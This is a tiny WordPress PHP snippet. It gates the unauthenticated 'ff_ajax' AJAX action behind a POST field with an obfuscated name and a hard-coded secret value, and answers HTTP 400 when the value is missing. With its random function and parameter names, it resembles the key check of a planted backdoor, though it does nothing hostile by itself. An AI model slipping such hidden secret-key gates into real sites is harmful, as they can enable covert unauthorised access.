<?php

function bank_slug_stock() {
	if (!isset($_POST["fgubnlijoq"]) || $_POST["fgubnlijoq"] !== "dIBoyiFX2M7V") { http_response_code(400); die(); }
}

add_action('wp_ajax_nopriv_ff_ajax', 'bank_slug_stock', 5, 1);
